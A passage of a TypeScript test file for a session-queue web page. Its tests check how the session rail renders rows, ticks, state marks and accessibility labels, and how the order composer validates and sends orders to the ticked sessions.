      assert.deepEqual(regions, [[stamp, `Last read ${(realUi.formatKstFull as (iso: string) => string)("2026-11-13T12:30:15.000Z")}`]]);
    });
  }
});

const ENDED_ID = "3d8a5f20-7c41-4b9e-8e2d-5a1c6b0f9e37";
const REPLACED_ID = "c41e9b07-2f6d-4a83-9b15-7e0d3c8a2f64";
const OTHER_RAIL_ID = "8e2b4f61-0d3a-4c97-b5e8-1f6a9c2d7b30";

function buildSessionRow(overrides: Record<string, unknown> = {}) {
  const id = String(overrides.id ?? SESSION_ID);
  return {
    id,
    sessionIdPrefix: id.slice(0, 8),
    name: "nightly-docs-sweep",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    state: "live",
    exitReason: null,
    isWaiting: true,
    lastActivityAt: "2026-11-12T03:41:09.336Z",
    count: { awaiting: 1, inDelivery: 0 },
    markerSetAt: null,
    isSelectable: true,
    ...overrides,
  };
}

const SESSION_ROWS = [
  buildSessionRow(),
  buildSessionRow({ id: ENDED_ID, name: "atrium-hooks", isNameRegistered: false, state: "exited", exitReason: "ended" }),
  buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false }),
];

function buildSessions(overrides: Record<string, unknown> = {}) {
  return {
    region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false },
    read: () => undefined,
    selectedIds: [],
    toggle: () => undefined,
    clear: () => undefined,
    isEndedShown: false,
    setEndedShown: () => undefined,
    ...overrides,
  };
}

// Orders as useOrdersQ hands it to the desk
function buildOrders(overrides: Record<string, unknown> = {}) {
  return {
    focus: () => undefined, aim: null, aimAt: () => undefined, clearAim: () => undefined, showEarlier: () => undefined, resend: () => undefined,
    thread: { status: "ready", items: [], nextCursor: null, error: null },
    composer: { text: "", isBusy: false, error: null }, setText: () => undefined, setImages: () => undefined, send: () => undefined, read: () => undefined, ...overrides,
  };
}

// the order view with its slots, the rail's ticks beside it
function renderOrders(orders: Record<string, unknown>, sessions: Record<string, unknown> = {}): RenderedNode {
  const { queue } = buildQueue({ sessions: buildSessions(sessions), orders: buildOrders(orders) });
  return renderCard("OrdersViewQ", { queue: withList(queue, []) });
}

// a Card atom's slots ride its props → rendered beside its body, so one tree holds the whole card
function renderCard(name: string, props: unknown): RenderedNode {
  const tree = render(name, props);
  const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
  const slots = ["title", "sub", "right", "bar", "foot"].map((key) => renderScreen(card?.props[key])).filter((node): node is RenderedNode => node !== null && typeof node !== "string");
  return { type: "Fragment", props: {}, children: [tree, ...slots] } as RenderedNode;
}

// the rail as the desk renders it: the page's scope, ticks and list
function renderRail(sessions: Record<string, unknown> = {}) {
  const { queue } = buildQueue({ sessions: buildSessions(sessions) });
  return { tree: renderCard("SessionsRegionQ", { queue: withList(queue, []) }) };
}

const railRowOf = (tree: RenderedNode, id: string) => findNodes(tree, (node) => node.props?.["data-session"] === id)[0] as RenderedNode;

describe("sessions rail rows", () => {
  test("a row shows the registered name, and a nameless row shows its start-directory name marked as such", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const named = collectText(railRowOf(tree, SESSION_ID));
    const nameless = collectText(railRowOf(tree, ENDED_ID));
    assert.ok(named.includes("nightly-docs-sweep") && !named.includes("start directory"), named);
    assert.ok(nameless.includes("atrium-hooks") && nameless.includes("start directory"), nameless);
  });

  test("two shown rows sharing a name show their id prefixes, and a unique name shows none", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, sessionIdPrefix: "4c0e19aa" }), buildSessionRow({ id: REPLACED_ID, name: "gersona" })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const prefixes = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "MachineString").length;
    assert.deepEqual([prefixes(SESSION_ID), prefixes(ENDED_ID), prefixes(REPLACED_ID)], [1, 1, 0]);
  });

  // spec §9.1 → per state, the first matching row: the tag in the tag column, its spoken word, and the hover line
  const railStates = [
    { name: "something not received leads, live or not", row: { state: "stale", isWaiting: false }, notReceived: 2, tag: "warn", word: "2 not received", hover: /^2 not received\. Resend them under the order\.$/ },
    { name: "an unreachable session says since when, listening or not", row: { state: "stale", isWaiting: false }, notReceived: 0, tag: "warn", word: "Not reachable", hover: /^Not reachable since .+ ago\. Orders wait for it\.$/ },
    { name: "a live session that does not listen gets the pause mark and the fix", row: { state: "live", isWaiting: false, count: { awaiting: 0, inDelivery: 1 } }, notReceived: 0, tag: "pause", word: "Next turn", hover: /^Next turn: orders reach it then\. Restart it to deliver now\.$/ },
    { name: "a live session with orders on the way counts them after its activity", row: { state: "live", count: { awaiting: 0, inDelivery: 1 } }, notReceived: 0, hover: /^Live · active .+ ago · 1 in delivery$/ },
    { name: "a live session with nothing on the way gives its last activity", row: { state: "live" }, notReceived: 0, hover: /^Live · active .+ ago$/ },
    { name: "an automatic resume not yet registered says so", row: { state: "exited", exitReason: "ended", markerSetAt: "2026-11-12T12:20:11.204Z" }, notReceived: 0, hover: /^Resume not yet registered\.$/ },
    { name: "a session that takes no message says it takes no orders", row: { state: "exited", exitReason: "replaced", isSelectable: false }, notReceived: 0, hover: /^Replaced: it takes no orders\.$/ },
    { name: "an ended session says when, in its exit words", row: { state: "exited", exitReason: "dead" }, notReceived: 0, hover: /^Ended .+ ago · process gone$/ },
  ];
  for (const row of railStates) {
    test(`rail state: ${row.name}`, () => {
      const state = call<{ tag?: string; word?: string; hover: string }>("getRailStateQ", buildSessionRow(row.row), row.notReceived);
      assert.deepEqual([state.tag, state.word], [row.tag, row.word]);
      assert.match(state.hover, row.hover);
    });
  }

  // spec §9.1: screen readers hear the hover line after the name → the box's description, reached with the box by keyboard
  test("a rail row's box is named Select and its session alone, and describes the row by its hover line, then the tick hint", () => {
    const rows = [buildSessionRow({ isWaiting: false }), buildSessionRow({ id: OTHER_RAIL_ID, name: "yoaida" })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const boxOf = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "input")[0] as RenderedNode;
    const [lineId, hintId] = String(boxOf(SESSION_ID).props["aria-describedby"]).split(" ");
    const [line] = findNodes(tree, (node) => node.props?.id === lineId);
    assert.deepEqual([boxOf(SESSION_ID).props["aria-label"], boxOf(OTHER_RAIL_ID).props["aria-label"], hintId], ["Select nightly-docs-sweep", "Select yoaida", "queue-rail-hint"]);
    assert.ok(collectText(line as RenderedNode).startsWith("Next turn: orders reach it then. Restart it to deliver now."), collectText(line as RenderedNode));
    assert.ok(String(railRowOf(tree, SESSION_ID).props.title).startsWith("Next turn: orders reach it then. Restart it to deliver now.\nwork-dev · "));
  });

  // spec §9.1: the tag is a bare mark, named for assistive technology by its word; a row holds no word Live and no badge but its count
  test("a not-listening rail row draws the bare pause mark named Next turn in its tag column, and no word Live or badge besides its count", () => {
    const rows = [buildSessionRow({ isWaiting: false, count: { awaiting: 2, inDelivery: 0 } })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const row = railRowOf(tree, SESSION_ID);
    const [tag] = findNodes(row, (node) => String(node.props?.className ?? "").startsWith("queue-rail-tag"));
    const [mark] = findNodes(tag as RenderedNode, (node) => node.props?.role === "img");
    const badges = findNodes(row, (node) => node.props?.atom === "Badge").map((node) => [node.props.role, node.props.fill]);
    assert.deepEqual([mark?.props["aria-label"], findNodes(mark as RenderedNode, (node) => node.type === "svg").length], ["Next turn", 1]);
    assert.deepEqual(badges, [["count", "tag"]]);
    assert.ok(!/\bLive\b/.test(collectText(row)), collectText(row));
  });

  test("a row that takes no message has no checkbox, and every other row's box is named Select and its session", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const boxOf = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "input" && node.props.type === "checkbox")[0];
    assert.equal(boxOf(SESSION_ID)?.props["aria-label"], "Select nightly-docs-sweep");
    assert.equal(boxOf(REPLACED_ID), undefined);
  });

  // spec §9.1: one control per row — the row is its checkbox's label, so a press anywhere on it ticks; a row that takes no message is no control
  test("a row is its checkbox's label and holds no button, and a row that takes no message is no label", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const controls = (id: string) => findNodes(railRowOf(tree, id), (node) => node.type === "button" || node.type === "input").map((node) => node.type);
    assert.deepEqual([railRowOf(tree, SESSION_ID).type, controls(SESSION_ID)], ["label", ["input"]]);
    assert.deepEqual([railRowOf(tree, REPLACED_ID).type, controls(REPLACED_ID)], ["div", []]);
  });

  // spec §9.1: box · state mark · name · tag · count from the row's start; a row that takes no message has no box, the rest in place
  test("a row reads its box, its state mark, its name, its tag and its count from the start, and a row that takes no message starts at its mark", () => {
    const rows = [buildSessionRow({ state: "live", isWaiting: false, count: { awaiting: 2, inDelivery: 0 } }), buildSessionRow({ id: REPLACED_ID, name: "gersona", isSelectable: false, count: { awaiting: 3, inDelivery: 0 } })];
    const { tree } = renderRail({ isEndedShown: true, region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const slots = (id: string) => findNodes(railRowOf(tree, id), (node) => /^queue-rail-(box|mark|name|tag|count)(\s|$)/.test(String(node.props?.className ?? "")))
      .map((node) => String(node.props.className).split(" ")[0]);
    assert.deepEqual([slots(SESSION_ID), slots(REPLACED_ID)], [["queue-rail-box", "queue-rail-mark", "queue-rail-name", "queue-rail-tag", "queue-rail-count"], ["queue-rail-mark", "queue-rail-name", "queue-rail-count"]]);
  });

  // spec §9.1: live → the filled mark; not live (not reachable, ended, a resume not yet registered) → the hollow ring
  const marks = [
    { name: "a live session wears the filled mark", row: { state: "live" }, isLive: true },
    { name: "a session not reachable wears the ring", row: { state: "stale" }, isLive: false },
    { name: "an ended session wears the ring", row: { state: "exited", exitReason: "dead" }, isLive: false },
    { name: "a resume not yet registered wears the ring", row: { state: "exited", exitReason: "ended", markerSetAt: "2026-11-12T12:20:11.204Z" }, isLive: false },
  ];
  for (const row of marks) {
    test(`state mark: ${row.name}`, () => {
      const { tree } = renderRail({ isEndedShown: true, region: { status: "ready", data: { sessions: [buildSessionRow(row.row)], hasMore: false }, error: null, busy: false } });
      const [mark] = findNodes(railRowOf(tree, SESSION_ID), (node) => String(node.props?.className ?? "").startsWith("queue-rail-mark"));
      assert.deepEqual([String(mark?.props.className).split(" ").includes("is-live"), mark?.props["aria-hidden"]], [row.isLive, "true"]);
    });
  }

  test("every box of the rail shares one description of what a tick does", () => {
    const { tree } = renderRail({ isEndedShown: true });
    const hints = findNodes(tree, (node) => node.type === "input" && node.props.type === "checkbox").map((node) => String(node.props["aria-describedby"]).split(" ").at(-1));
    const [hint] = findNodes(tree, (node) => node.props?.id === hints[0]);
    assert.ok(hints.length === 3 && hints.every((id) => id === hints[0]), String(hints));
    assert.equal(collectText(hint as RenderedNode), "Ticked sessions filter the list and receive the next order. None ticked shows every session; no order can be sent.");
  });

  test("ticking a row calls the toggle with that row's id", () => {
    const toggled: unknown[] = [];
    const { tree } = renderRail({ isEndedShown: true, toggle: (id: string) => toggled.push(id) });
    const [box] = findNodes(railRowOf(tree, ENDED_ID), (node) => node.type === "input" && node.props.type === "checkbox");
    (box?.props.onChange as () => void)();
    assert.deepEqual(toggled, [ENDED_ID]);
  });

  test("ticking adds a row and ticking it again removes it, keeping the other ticks", () => {
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID], ENDED_ID), [SESSION_ID, ENDED_ID]);
    assert.deepEqual(call("putToggledIdQ", [SESSION_ID, ENDED_ID], SESSION_ID), [ENDED_ID]);
  });

  test("ended rows stay folded until the Ended band is open", () => {
    const ids = (isEndedShown: boolean) => call<Array<{ id: string }>>("getShownSessionsQ", SESSION_ROWS, isEndedShown).map((row) => row.id);
    assert.deepEqual(ids(false), [SESSION_ID]);
    assert.deepEqual(ids(true), [SESSION_ID, ENDED_ID, REPLACED_ID]);
  });

  test("the waiting count is the row's count atom in the tag fill, never solid, and a session with nothing waiting shows none", () => {
    const rows = [buildSessionRow({ count: { awaiting: 5, inDelivery: 0 } }), buildSessionRow({ id: ENDED_ID, name: "gersona", count: { awaiting: 0, inDelivery: 0 } })];
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } });
    const counts = (id: string) => findNodes(railRowOf(tree, id), (node) => node.props?.atom === "Badge").map((node) => `${node.props.role} ${node.props.fill} ${collectText(node)}`);
    assert.deepEqual([counts(SESSION_ID), counts(ENDED_ID)], [["count tag 5"], []]);
  });
});

describe("the ticks as the one selection", () => {
  const gersona = buildSession({ id: "a1", name: "gersona" });
  const yoaida = buildSession({ id: "b2", name: "yoaida" });
  const atrium = buildSession({ id: "c3", name: "atrium" });
  const items = [buildItem({ id: 1, session: gersona }), buildItem({ id: 2, session: yoaida }), buildItem({ id: 3, session: atrium })];
  // spec §9.1: the ticked sessions are the list's scope; nothing ticked → every session's items
  const scopes = [
    { name: "nothing ticked shows every session's items", ids: [], expected: [1, 2, 3] },
    { name: "two ticked show theirs and leave a third session's out", ids: ["a1", "b2"], expected: [1, 2] },
  ];
  for (const row of scopes) {
    test(`the list's scope: ${row.name}`, () => {
      assert.deepEqual(call<Array<{ id: number }>>("getVisibleItemsQ", items, { profile: "" }, row.ids).map((item) => item.id), row.expected);
    });
  }

  // spec §9.9 Part 1: a relay is in scope while either end is ticked — the sender matched by its id prefix, the page holding no sender id
  const SENDER_ID = "9d2f4c10-6a1e-4b2d-8c3f-1e7a5b9d0c22";
  const relayEnds = {
    yoaida: buildSession({ id: "7be210c4-3f5a-4e8b-9d1c-6a2f0e4b8d71", name: "yoaida", profileLabel: "personal" }),
    sixmon: buildSession({ id: "41aa0b7e-8c2d-4f6a-b3e9-5d1c7a0f2e94", name: "sixmon", profileLabel: "personal" }),
    atrium: buildSession({ id: "5c0e91aa-2b7f-4d3e-a8c6-0f9e1d4b7a53", name: "atrium", profileLabel: "personal" }),
  };
  const relaySender = { sessionIdPrefix: SENDER_ID.slice(0, 8), profileLabel: "work", selfDeclaredName: "gersona", cwdTail: "git/gersona" };
  const relayCopy = (id: number, session: unknown) => buildItem({
    id, kind: "relay", status: "answered", options: [], sendId: "relay-send-7", session,
    relay: { hop: 0, parent: null, sender: relaySender, fetchedAt: null, redaction: null, lapsedAt: null },
  });
  const relayItems = [buildItem({ id: 1, session: relayEnds.atrium }), relayCopy(412, relayEnds.yoaida), relayCopy(413, relayEnds.sixmon)];
  const relayScopes = [
    { name: "nothing ticked lists the relay", ids: [], filter: "", expected: [1, 412, 413] },
    { name: "the sender ticked alone lists the relay with every copy", ids: [SENDER_ID], filter: "", expected: [412, 413] },
    { name: "one recipient ticked lists the relay with every copy", ids: [relayEnds.sixmon.id], filter: "", expected: [412, 413] },
    { name: "only a third session ticked leaves the relay out", ids: [relayEnds.atrium.id], filter: "", expected: [1] },
    { name: "the sender's account lists the relay its recipients' account would", ids: [], filter: "work", expected: [412, 413] },
  ];
  for (const row of relayScopes) {
    test(`a relay in the list's scope: ${row.name}`, () => {
      assert.deepEqual(call<Array<{ id: number }>>("getVisibleItemsQ", relayItems, { profile: row.filter }, row.ids).map((item) => item.id), row.expected);
    });
  }

  test("a relay with its sender and a recipient ticked is one row", () => {
    const groups = call<Array<{ rows: Array<{ id: number; copies: unknown[] }> }>>("getListGroupsQ", relayItems, { done: { items: [], nextCursor: null }, relays: { items: [], refusals: [], nextCursor: null } }, { profile: "" }, [SENDER_ID, relayEnds.yoaida.id]);
    assert.deepEqual(groups.flatMap((group) => group.rows).map((row) => [row.id, row.copies.length]), [[412, 2]]);
  });

  const rails = [buildSessionRow({ id: "a1", name: "gersona" }), buildSessionRow({ id: "b2", name: "yoaida" })];
  const titles = [
    { name: "nothing ticked reads All sessions", ids: [], title: "All sessions" },
    { name: "one tick names its session", ids: ["b2"], title: "yoaida" },
    { name: "several ticks name them all in tick order", ids: ["b2", "a1"], title: "yoaida, gersona" },
  ];
  for (const row of titles) test(`the list's head: ${row.name}`, () => assert.equal(call("getScopeTitleQ", rails, row.ids), row.title));

  test("no rail row and no band is aria-current, whatever is ticked", () => {
    const { tree } = renderRail({ selectedIds: [SESSION_ID] });
    assert.equal(findNodes(tree, (node) => node.props?.["aria-current"] !== undefined).length, 0);
  });

  // master box (spec §9.1): nothing ticked → every live session that takes a message; anything ticked → every tick cleared, an ended one's too
  const live = buildSessionRow({ id: "d4", name: "aidl" });
  const masterRows = [...SESSION_ROWS, live];
  const masters = [
    { name: "none ticked ticks every live session", ids: [], next: [SESSION_ID, "d4"], state: "none" },
    { name: "an ended tick alone clears", ids: [ENDED_ID], next: [], state: "some" },
    { name: "some live ticked clears every tick", ids: [SESSION_ID, ENDED_ID], next: [], state: "some" },
    { name: "every live session ticked clears them all", ids: [SESSION_ID, "d4"], next: [], state: "all" },
  ];
  for (const row of masters) {
    test(`the master box: ${row.name}`, () => {
      assert.equal(call("getMasterTickQ", row.ids, masterRows), row.state);
      assert.deepEqual(call("putMasterTickQ", row.ids, masterRows), row.next);
    });
  }

  test("the master box is named for every live session, and absent while no session takes a message", () => {
    const masterOf = (rows: unknown[]) => findNodes(renderRail({ region: { status: "ready", data: { sessions: rows, hasMore: false }, error: null, busy: false } }).tree, (node) => node.props?.["aria-label"] === "Select all live sessions").length;
    assert.deepEqual([masterOf(SESSION_ROWS), masterOf([SESSION_ROWS[2]])], [1, 0]);
  });

  // spec §9.1 → In the address: a tick on a session that no longer takes a message is dropped and said in the status line
  const dropped = [
    { name: "one", ids: [SESSION_ID, REPLACED_ID], line: "⚠ nightly-docs-sweep no longer takes orders and was unticked." },
    { name: "none", ids: [SESSION_ID], line: null },
  ];
  for (const row of dropped) test(`a dropped tick's status line: ${row.name}`, () => assert.equal(call("getDroppedNoteQ", row.ids, SESSION_ROWS), row.line));

  // spec §9.2: the recipients changed under a draft → the note says so once
  const changes = [
    { name: "to two sessions", names: ["gersona", "yoaida"], note: "Recipients changed: now gersona and yoaida." },
    { name: "to none", names: [], note: "No session ticked now: this order has no recipient." },
  ];
  for (const row of changes) test(`the recipients-changed note: ${row.name}`, () => assert.equal(call("getRecipientsNoteQ", row.names), row.note));

  test("the master box shows the mixed state while only some live sessions are ticked", () => {
    const rows = [buildSessionRow(), buildSessionRow({ id: ENDED_ID, state: "live" })];
    assert.equal(call("getMasterTickQ", [SESSION_ID], rows), "some");
  });

  test("the session ticks round-trip through the hash", async () => {
    const location = { hash: "#queue?to=a1,b2&item=7" };
    const module = (await loadScreenModule(QUEUE_SRC, { URLSearchParams, window: { UI: uiStub(), location, history: { replaceState: (_s: unknown, _t: string, url: string) => { location.hash = url; } } } })) as ScreenModule;
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), ["a1", "b2"]);
    (module.setHashStateQ as (patch: unknown) => void)({ to: "" });
    assert.deepEqual(getPlain((module.getTicksFromHashQ as () => unknown)()), []);
  });
});

// a count the rail has not read is no claim → no `0 live · 0 ended` over its placeholder or its outage
describe("the rail head", () => {
  const headSub = (region: unknown) => {
    const { queue } = buildQueue({ sessions: buildSessions({ region }) });
    const tree = render("SessionsRegionQ", { queue: withList(queue, []) });
    return findNodes(tree, (node) => node.props?.atom === "Card")[0]?.props.sub;
  };
  const live = SESSION_ROWS.filter((row) => row.state !== "exited").length;
  const rows = [
    { name: "a first read in flight states no count", region: { status: "loading", data: null, error: null, busy: true }, expected: undefined },
    { name: "a failed first read states no count", region: { status: "error", data: null, error: { message: "down" }, busy: false }, expected: undefined },
    { name: "a read rail states its live and ended counts", region: { status: "ready", data: { sessions: SESSION_ROWS, hasMore: false }, error: null, busy: false }, expected: `${live} live · ${SESSION_ROWS.length - live} ended` },
  ];
  for (const row of rows) test(row.name, () => assert.equal(headSub(row.region), row.expected));
});

describe("the rail foot", () => {
  const resumes = (results: string[]) => ({ status: "ready", busy: false, error: null, data: results.map((result, index) => ({ item: { id: index + 1, title: "Rebase" }, session: { profileLabel: "work-dev", cwdTail: "wt/a" }, attempt: 1, sentAt: "2026-11-12T12:20:11.204Z", result, abortReason: null, bgId: null })) });
  const footButton = (region: unknown) => {
    const { queue } = buildQueue({ resumes: region });
    const tree = renderCard("SessionsRegionQ", { queue: withList(queue, []) });
    return findNodes(tree, (node) => node.type === "button" && collectText(node).includes("Automatic resumes")).map((node) => collectText(node));
  };
  const rows = [
    { name: "two resumes open from one quiet button with their count", region: resumes(["sent", "acked"]), expected: ["Automatic resumes 2"] },
    { name: "a failed resume puts the warning glyph before the label", region: resumes(["failed"]), expected: ["⚠ Automatic resumes 1"] },
    { name: "no resume renders no button", region: resumes([]), expected: [] },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(footButton(row.region), row.expected));

  test("the foot at rest, its drawer closed, keeps the page scrollable on the Queue and after leaving it", async () => {
    const effects = createEffectReact();
    const doc = createFakeDocument();
    const live = (await loadScreenModule(UI_SRC, { React: effects.react, document: doc })) as { UI: Record<string, unknown> };
    const page = (await loadScreenModule(QUEUE_SRC, { React: effects.react, URLSearchParams, window: { UI: live.UI, location: { hash: "#queue" } } })) as ScreenModule;
    const { queue } = buildQueue({ resumes: resumes(["acked"]) });
    doc.reset();

    const foot = effects.mount(() => (page.RailFootQ as Component)({ queue }), () => ({}));
    const onQueue = doc.body.style.overflow;
    foot.unmount();

    assert.deepEqual({ onQueue, afterLeaving: doc.body.style.overflow }, { onQueue: "auto", afterLeaving: "auto" });
  });
});

describe("order composer", () => {
  const shown = SESSION_ROWS;
  // one tick set → list scope, thread and recipients agree: a ticked ended row stays a recipient while its band is folded
  test("the targets are every ticked row that takes a message, an ended one included, never a replaced row", () => {
    const ticked = [SESSION_ID, ENDED_ID, REPLACED_ID];
    assert.deepEqual(call("getSendTargetsQ", shown, ticked), { ids: [SESSION_ID, ENDED_ID], names: ["nightly-docs-sweep", "atrium-hooks"], endedCount: 1 });
  });

  // spec §9.2 → Foot: the send button names who the order goes to
  const labels = [
    { name: "no tick", targets: { ids: [], names: [], endedCount: 0 }, label: "Send order" },
    { name: "one target names it", targets: { ids: [SESSION_ID], names: ["gersona"], endedCount: 0 }, label: "Send to gersona" },
    { name: "several targets count them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 0 }, label: "Send to 2 sessions" },
    { name: "an ended target among them", targets: { ids: [SESSION_ID, ENDED_ID], names: ["gersona", "yoaida"], endedCount: 1 }, label: "Send to 2 sessions · resumes 1 ended" },
  ];
  for (const row of labels) test(`the send label: ${row.name}`, () => assert.equal(call("getSendLabelQ", call("getSendPartsQ", row.targets)), row.label));

  const MAX_TARGETS = vm.runInContext("MESSAGE_Q.MAX_TARGETS", screen) as number;
  const targetsOf = (count: number) => ({ ids: Array.from({ length: count }, () => randomUUID()), names: Array.from({ length: count }, (_v, index) => `s${index}`), endedCount: 0 });
  // spec §9.2 → Foot: a press with something missing says what, and focus goes to the control that fixes it
  const invalids = [
    { name: "no session ticked", targets: targetsOf(0), text: "rebase on main", invalid: { message: "Tick at least one session in the rail.", focus: "rail" } },
    { name: "blank text", targets: targetsOf(1), text: " \n\t ", invalid: { message: "Write the order, then send.", focus: "box" } },
    { name: "more targets than one send takes", targets: targetsOf(MAX_TARGETS + 3), text: "rebase on main", invalid: { message: `Up to ${MAX_TARGETS} sessions per order: untick 3.`, focus: "rail" } },
    { name: "the cap itself", targets: targetsOf(MAX_TARGETS), text: "rebase on main", invalid: null },
  ];
  for (const row of invalids) test(`a send press: ${row.name}`, () => assert.deepEqual(call("getOrderInvalidQ", row.targets, row.text), row.invalid));

  // spec §4.5 → the Orders composer sends a new order to the ticked sessions; it never answers or closes a report
  test("the Orders composer sends the typed order to the ticked sessions and no item action", () => {
    const { queue, calls } = buildQueue({ orders: buildOrders({ composer: { text: "typed order", isBusy: false, error: null }, send: (...args: unknown[]) => calls.push(["orderSend", ...args]) }) });
    const listed = withList(queue, []);
    const box = call("getOrderBoxQ", listed);
    const targets = { ids: [SESSION_ID], names: ["atrium"], endedCount: 0 };
    const tree = render("OrderComposerQ", { queue: listed, targets, box, tray: call("getTrayQ", { fieldId: "queue-order-text", box }) });
    assert.equal(collectText(tree).includes("Re:"), false);
    const [send] = findNodes(tree, (node) => node.type === "button" && String(node.props.className).includes("primary"));
    (send?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls.filter((one) => ["settle", "orderSend"].includes(String(one[0])))).map((one) => (one as unknown[]).slice(0, 2)), [["orderSend", { sessionIds: [SESSION_ID], text: "typed order" }]]);
  });

  // spec §10 → Rail "no session takes a message": the note says so, not "tick one"; before the rail loads nothing is known
  const notes = [
    { name: "none ticked", count: 0, rows: [buildSessionRow()], note: "Tick a session in the rail to address this order." },
    { name: "none ticked before the rail loads", count: 0, rows: null, note: "Tick a session in the rail to address this order." },
    { name: "no session takes a message", count: 0, rows: [buildSessionRow({ isSelectable: false }), buildSessionRow({ id: REPLACED_ID, state: "exited", exitReason: "replaced", isSelectable: false })], note: "No session can take an order right now." },
    { name: "one ticked", count: 1, rows: [buildSessionRow()], note: "Goes to s0." },
    { name: "several ticked", count: 2, rows: [buildSessionRow()], note: "Each ticked session gets its own copy." },
  ];
  for (const row of notes) test(`the note at rest: ${row.name}`, () => assert.equal(call("getOrderNoteQ", targetsOf(row.count), row.rows), row.note));

  // spec §9.2 → Note at rest: where the owner decides whether to send, the note says what follows for a ticked session that does not listen
  const deaf = (id: string, name: string) => buildSessionRow({ id, name, isWaiting: false });
  const deafNotes = [
    { name: "one ticked, next turn", rows: [deaf(SESSION_ID, "yoaida")], ids: [SESSION_ID], note: "yoaida gets this at its next turn. Restart it to deliver now." },
    { name: "several ticked, one next turn", rows: [deaf(SESSION_ID, "yoaida"), buildSessionRow({ id: OTHER_RAIL_ID, name: "gersona" })], ids: [SESSION_ID, OTHER_RAIL_ID], note: "Each ticked session gets its own copy. yoaida waits for its next turn. Restart it to deliver now." },
    { name: "several ticked, two next turn", rows: [deaf(SESSION_ID, "yoaida"), deaf(OTHER_RAIL_ID, "gersona")], ids: [SESSION_ID, OTHER_RAIL_ID], note: "Each ticked session gets its own copy. yoaida and gersona wait for their next turn. Restart them to deliver now." },
    { name: "an unticked session that does not listen is not named", rows: [buildSessionRow({ name: "yoaida" }), deaf(OTHER_RAIL_ID, "gersona")], ids: [SESSION_ID], note: "Goes to yoaida." },
    { name: "an ended session is resumed, so it is not named", rows: [buildSessionRow({ name: "yoaida", state: "exited", exitReason: "ended", isWaiting: false })], ids: [SESSION_ID], note: "Goes to yoaida." },
  ];
  for (const row of deafNotes) {
    test(`the note at rest: ${row.name}`, () => {
      const names = row.ids.map((id) => row.rows.find((one) => one.id === id)?.name);
      assert.equal(call("getOrderNoteQ", { ids: row.ids, names, endedCount: 0 }, row.rows), row.note);
    });
  }

  test("the page's per-send target cap is the send route's: the cap passes and one more is refused", () => {
    const text = "rebase on main";
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS), text }).success, true);
    assert.equal(messageBodySchema.safeParse({ sessionIds: ids(MAX_TARGETS + 1), text }).success, false);
  });
});

// spec §4.5 → two composers on one screen: the sheet's label names the item, the Orders label the people
describe("the two composers told apart", () => {
  const labels = [
    { name: "a decision's box is about the decision", item: buildItem({ id: 3, isFreeTextAllowed: true }), label: "Your own answer or a note on this decision (optional)" },
    { name: "a report's box is an order on the report, to its session", item: buildItem({ id: 5, kind: "report", options: [], isFreeTextAllowed: true, session: buildSession({ name: "yoaida" }) }), label: "Order to yoaida on this report (optional)" },
  ];
  for (const row of labels) {
    test(`the sheet's label: ${row.name}`, () => {
      const [label] = findNodes(renderSheet({ item: row.item, queue: buildQueue().queue }), (node) => node.type === "label" && String(node.props.className).includes("field-label"));
      assert.equal(collectText(label as RenderedNode), row.label);
    });
  }
});

describe("an order send's answer", () => {
  const run = async (status: number, answer: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null };
    const statuses: unknown[] = [];
    const counts = { sent: 0, refused: 0 };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" },
      names: ["gersona", "yoaida"],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); },
      setStatus: (next: unknown) => statuses.push(next),
      onSent: () => { counts.sent += 1; },
      onRefused: () => { counts.refused += 1; },
    });
    return { isDone, posts: getPlain(posts), composer: getPlain(composer), statuses: getPlain(statuses), sent: counts.sent, refused: counts.refused };
  };

  // spec §9.3 → After sending: the ticks stay, so the next line goes to the same sessions; the list's status line names them
  test("a taken send posts every ticked id with the text, empties the box, says who it went to and re-reads", async () => {
    const result = await run(201, { items: [{ id: 81, sessionId: SESSION_ID }, { id: 82, sessionId: ENDED_ID }] });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/messages/send", body: { sessionIds: [SESSION_ID, ENDED_ID], text: "rebase on main" } }]);
    assert.equal(result.isDone, true);
    assert.deepEqual(result.composer, { text: "", isBusy: false, error: null });
    assert.deepEqual(result.statuses, [{ text: "✓ Order sent to gersona and yoaida", orderId: 81 }]);
    assert.deepEqual([result.sent, result.refused], [1, 0]);
  });

  const refusals = [
